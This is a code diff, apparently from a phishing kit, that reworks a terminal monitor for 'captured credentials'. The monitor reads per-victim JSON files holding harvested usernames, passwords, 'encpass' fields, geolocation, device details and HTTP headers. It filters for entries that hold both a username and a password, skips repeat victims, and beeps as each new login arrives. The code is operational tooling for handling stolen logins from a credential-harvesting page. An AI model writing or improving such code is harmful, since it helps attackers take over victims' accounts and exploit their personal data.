@@ -4,7 +4,7 @@ import time
 
 import json
 
-from utils import CREDENTIALS_DIR, RESET
+from utils import CREDENTIALS_DIR, RESET, extract_timestamp_from_filename, get_credential_files
 
 
 
@@ -30,34 +30,6 @@ class Color:
 
 
 
-def get_credential_count(site_name):
-
-    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
-
-    credentials_file = os.path.join(site_dir, "result.json")
-
-    if not os.path.exists(credentials_file):
-
-        return 0
-
-    try:
-
-        with open(credentials_file, "r") as f:
-
-            data = json.load(f)
-
-            if isinstance(data, list):
-
-                return len(data)
-
-    except Exception:
-
-        pass
-
-    return 0
-
-
-
 def format_value(key, value):
 
     """Returns a tuple (icon, color, formatted_value) based on key content"""
@@ -68,7 +40,7 @@ def format_value(key, value):
 
     
 
-    if 'pass' in k_lower:
+    if 'pass' in k_lower or 'encpass' in k_lower:
 
         return "🔑", Color.RED, val_str
 
@@ -152,181 +124,281 @@ def print_category(category_name, category_icon, data_dict, is_last_category):
 
 
 
-def print_credentials(site_name):
+def extract_username_from_entry(entry):
 
-    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
+    """Extract username from credential entry for deduplication"""
 
-    credentials_file = os.path.join(site_dir, "result.json")
+    raw_data = entry.get('data', {})
 
     
 
-    if not os.path.exists(credentials_file):
+    if isinstance(raw_data, dict):
 
-        return
+                                                           
 
+        for key in ['email', 'username', 'user', 'login', 'user_id']:
 
+            if key in raw_data and raw_data[key]:
 
-    try:
+                return str(raw_data[key]).strip().lower()
 
-        with open(credentials_file, 'r', encoding='utf-8') as f:
+    
 
-            data = json.load(f)
+                            
 
-    except Exception:
+    client_info = entry.get('client_info', {})
 
-        return
+    if client_info and 'ip' in client_info:
 
+        return client_info['ip']
 
+    
 
-    if not data:
-
-        return
-
-
-
-    if not isinstance(data, list):
-
-        data = [data]
+    return "unknown"
 
 
 
-                                       
+def has_meaningful_credentials(entry):
 
-    recent_entries = data[-5:][::-1]
+    """Check if entry contains meaningful credentials (not just partial data)"""
+
+    raw_data = entry.get('data', {})
+
+    
+
+    if not isinstance(raw_data, dict):
+
+        return False
+
+    
+
+                              
+
+    has_username = False
+
+    for key in ['email', 'username', 'user', 'login']:
+
+        if key in raw_data and raw_data[key] and str(raw_data[key]).strip():
+
+            has_username = True
+
+            break
+
+    
+
+                        
+
+    has_password = False
+
+    for key in ['pass', 'password', 'encpass', 'passwd']:
+
+        if key in raw_data and raw_data[key] and str(raw_data[key]).strip():
+
+            has_password = True
+
+            break
+
+    
+
+                                                           
+
+    return has_username and has_password
 
 
 
-    print(f"\n{Color.HEADER}{Color.BOLD}🌳 Latest Captured Credentials:{Color.RESET}\n")
+def display_single_credential(entry, filename=""):
+
+    """Display a single credential entry"""
+
+    if filename:
+
+        print(f"\n{Color.CYAN}📁 File: {filename}{Color.RESET}")
+
+    
+
+    timestamp = entry.get('timestamp', 'N/A')
+
+    
+
+    print(f"{Color.GREEN}📦 NEW CREDENTIAL CAPTURED!{Color.RESET}")
+
+    print(f"{Color.BLUE}├──{Color.RESET} 🕒 {Color.BOLD}Time:{Color.RESET} {timestamp}")
 
 
 
-    for i, entry in enumerate(recent_entries, 1):
+    raw_data = entry.get('data', {})
 
-        actual_index = len(data) - i + 1
+    form_data = {}
 
-        
+    
 
-        timestamp = entry.get('timestamp', 'N/A')
+    if isinstance(raw_data, dict):
 
-
-
-        raw_data = entry.get('data', {})
-
-        form_data = {}
-
-        if isinstance(raw_data, dict) and 'form_data' in raw_data:
+        if 'form_data' in raw_data:
 
             form_data = raw_data.get('form_data', {})
 
-                                                                             
+                                          
 
             for k, v in raw_data.items():
 
                 if k not in ['form_data', 'client_env'] and isinstance(v, (str, int, float, bool)):
 
-                     form_data[k] = v
+                    form_data[k] = v
 
         else:
 
             form_data = raw_data
 
+    
 
+    client_info = entry.get('client_info', {})
 
-        client_info = entry.get('client_info', {})
+    if not client_info and 'meta' in entry:
 
-        if not client_info and 'meta' in entry:
+        client_info = entry.get('meta', {})
 
-            client_info = entry.get('meta', {})
+    
 
+    geo_data = {}
 
+    headers_data = {}
 
-        geo_data = {}
+    client_env_data = {}
 
-        headers_data = {}
+    network_data = {}
 
-        client_env_data = {}
+    
 
-        network_data = {}
+    if isinstance(raw_data, dict) and 'client_env' in raw_data:
 
-        
+         client_env_data = raw_data['client_env']
 
-        if isinstance(raw_data, dict) and 'client_env' in raw_data:
+    
 
-             client_env_data = raw_data['client_env']
+    for k, v in client_info.items():
 
+        if k == 'geo' and isinstance(v, dict):
 
+            geo_data = v
 
-        for k, v in client_info.items():
+        elif k == 'headers' and isinstance(v, dict):
 
-            if k == 'geo' and isinstance(v, dict):
+            headers_data = v
 
-                geo_data = v
+        elif k == 'client_env' and isinstance(v, dict):
 
-            elif k == 'headers' and isinstance(v, dict):
+            client_env_data = v
 
-                headers_data = v
+        elif isinstance(v, dict):
 
-            elif k == 'client_env' and isinstance(v, dict):
+            network_data[k] = str(v)
 
-                client_env_data = v
+        else:
 
-            elif isinstance(v, dict):
-
-                                                                     
-
-                network_data[k] = str(v)
-
-            else:
-
-                network_data[k] = v
-
-
-
-        print(f"{Color.GREEN}📦 Entry #{actual_index}{Color.RESET}")
-
-        
-
-                                       
-
-        print(f"{Color.BLUE}├──{Color.RESET} 🕒 {Color.BOLD}Time:{Color.RESET} {timestamp}")
+            network_data[k] = v
 
 
 
-        categories = []
+    categories = []
 
-        
+    
 
-        if form_data:
+    if form_data:
 
-            categories.append({"name": "Credentials", "icon": "🔐", "data": form_data})
+        categories.append({"name": "Credentials", "icon": "🔐", "data": form_data})
 
-        if geo_data:
+    if geo_data:
 
-            categories.append({"name": "Geo-Location", "icon": "🌍", "data": geo_data})
+        categories.append({"name": "Geo-Location", "icon": "🌍", "data": geo_data})
 
-        if network_data:
+    if network_data:
 
-            categories.append({"name": "Network & Device", "icon": "📡", "data": network_data})
+        categories.append({"name": "Network & Device", "icon": "📡", "data": network_data})
 
-        if client_env_data:
+    if client_env_data:
 
-            categories.append({"name": "Client Environment", "icon": "🖥️ ", "data": client_env_data})
+        categories.append({"name": "Client Environment", "icon": "🖥️ ", "data": client_env_data})
 
-        if headers_data:
+    if headers_data:
 
-            categories.append({"name": "HTTP Headers", "icon": "📨", "data": headers_data})
+        categories.append({"name": "HTTP Headers", "icon": "📨", "data": headers_data})
 
 
 
-        for idx, cat in enumerate(categories):
+    for idx, cat in enumerate(categories):
 
-            is_last = (idx == len(categories) - 1)
+        is_last = (idx == len(categories) - 1)
 
-            print_category(cat['name'], cat['icon'], cat['data'], is_last)
+        print_category(cat['name'], cat['icon'], cat['data'], is_last)
+
+    
+
+    print("")                          
+
+
+
+def print_recent_credentials(site_name, count=5):
+
+    """Print recent credentials for manual viewing"""
+
+    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
+
+    
+
+    if not os.path.exists(site_dir):
+
+        print(f"{Color.YELLOW}No credentials found for {site_name}{Color.RESET}")
+
+        return
+
+    
+
+                              
+
+    credential_files = get_credential_files(site_name)
+
+    
+
+    if not credential_files:
+
+        print(f"{Color.YELLOW}No credential files found for {site_name}{Color.RESET}")
+
+        return
+
+    
+
+    print(f"\n{Color.HEADER}{Color.BOLD}🌳 Recent Captured Credentials for {site_name}:{Color.RESET}\n")
+
+    
+
+                            
+
+    recent_files = credential_files[:count]
+
+    
+
+    for i, filename in enumerate(recent_files, 1):
+
+        cred_file = os.path.join(site_dir, filename)
+
+        try:
+
+            with open(cred_file, 'r', encoding='utf-8') as f:
+
+                entry = json.load(f)
 
             
 
-        print("")          
+            print(f"{Color.GREEN}📦 Entry #{i}{Color.RESET}")
+
+            display_single_credential(entry, filename)
+
+            
+
+        except Exception as e:
+
+            print(f"{Color.RED}Error reading {filename}: {e}{Color.RESET}")
 
 
 
@@ -334,79 +406,233 @@ def monitor_credentials(site_name):
 
     site_dir = os.path.join(CREDENTIALS_DIR, site_name)
 
-    credentials_file = os.path.join(site_dir, "result.json")
-
     
 
-    last_count = 0
-
-    if not os.path.exists(credentials_file):
+    if not os.path.exists(site_dir):
 
         os.makedirs(site_dir, exist_ok=True)
 
-        with open(credentials_file, 'w') as f:
+    
 
-            json.dump([], f)
+    print(f"\n{Color.BOLD}{Color.BLUE}🔍 Monitoring for NEW credentials... (Ctrl+C to stop){Color.RESET}")
 
-    else:
+    print(f"{Color.YELLOW}Note: Only credentials captured AFTER this point will be shown{Color.RESET}")
 
-        try:
+    
 
-            with open(credentials_file, 'r') as f:
+                                           
 
-                last_count = len(json.load(f))
+    existing_files_at_startup = set()
 
-        except json.JSONDecodeError:
+    if os.path.exists(site_dir):
 
-            last_count = 0
+        for f in os.listdir(site_dir):
 
-            
+            if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index'):
 
-    print(f"\n{Color.BOLD}{Color.BLUE}Waiting for credentials... (Ctrl+C to stop){Color.RESET}")
+                existing_files_at_startup.add(f)
+
+    
+
+                                                                       
+
+    displayed_usernames = {}
+
+                                         
+
+    processed_files = set()
+
+    
+
+                                         
+
+    startup_time = time.time()
+
+    
 
     try:
 
         while True:
 
-            current_count = 0
+                               
 
-            try:
+            current_files = set()
 
-                if os.path.exists(credentials_file):
+            if os.path.exists(site_dir):
 
-                    with open(credentials_file, 'r') as f:
+                for f in os.listdir(site_dir):
 
-                        data = json.load(f)
+                    if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index'):
 
-                        current_count = len(data)
-
-            except (json.JSONDecodeError, OSError):
-
-                pass
-
-
-
-            if current_count > last_count:
-
-                print_credentials(site_name)
-
-                last_count = current_count
-
-                try:
-
-                    import winsound
-
-                    winsound.Beep(1000, 300)
-
-                except:
-
-                    pass
+                        current_files.add(f)
 
             
 
-            time.sleep(1)
+                                                                                    
+
+            new_files = current_files - existing_files_at_startup - processed_files
+
+            
+
+            if new_files:
+
+                                                            
+
+                sorted_new_files = sorted(
+
+                    list(new_files), 
+
+                    key=lambda x: extract_timestamp_from_filename(x), 
+
+                    reverse=True
+
+                )
+
+                
+
+                for filename in sorted_new_files:
+
+                    cred_file = os.path.join(site_dir, filename)
+
+                    
+
+                                                                             
+
+                    try:
+
+                        file_creation_time = os.path.getctime(cred_file)
+
+                        if file_creation_time < startup_time - 2:                   
+
+                                                                                   
+
+                            processed_files.add(filename)
+
+                            continue
+
+                    except:
+
+                        pass
+
+                    
+
+                    try:
+
+                        with open(cred_file, 'r', encoding='utf-8') as f:
+
+                            entry = json.load(f)
+
+                        
+
+                                                            
+
+                        username = extract_username_from_entry(entry)
+
+                        
+
+                                                                                           
+
+                        current_time = time.time()
+
+                        if username in displayed_usernames:
+
+                            last_display_time = displayed_usernames[username]
+
+                            if current_time - last_display_time < 30:                      
+
+                                                
+
+                                processed_files.add(filename)
+
+                                continue
+
+                        
+
+                                                                                                   
+
+                        if not has_meaningful_credentials(entry):
+
+                                                                 
+
+                            processed_files.add(filename)
+
+                            continue
+
+                        
+
+                                                     
+
+                        display_single_credential(entry, filename)
+
+                        
+
+                                           
+
+                        displayed_usernames[username] = current_time
+
+                        processed_files.add(filename)
+
+                        
+
+                                                 
+
+                        try:
+
+                            import winsound
+
+                            winsound.Beep(1000, 300)
+
+                        except:
+
+                            pass
+
+                            
+
+                    except Exception as e:
+
+                        print(f"{Color.RED}Error reading {filename}: {e}{Color.RESET}")
+
+                        processed_files.add(filename)
+
+            
+
+                                                                     
+
+            current_time = time.time()
+
+            old_usernames = []
+
+            for username, display_time in displayed_usernames.items():
+
+                if current_time - display_time > 300:             
+
+                    old_usernames.append(username)
+
+            
+
+            for username in old_usernames:
+
+                del displayed_usernames[username]
+
+            
+
+            time.sleep(1)                      
+
+            
 
     except KeyboardInterrupt:
 
-        pass
+        print(f"\n{Color.YELLOW}⏹️  Monitoring stopped.{Color.RESET}")
+
+                      
+
+        if os.path.exists(site_dir):
+
+            total_files = len([f for f in os.listdir(site_dir) 
+
+                             if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index')])
+
+            print(f"{Color.CYAN}📊 Total credentials for {site_name}: {total_files}{Color.RESET}")
+
+            print(f"{Color.CYAN}👤 Unique users displayed: {len(displayed_usernames)}{Color.RESET}")
 
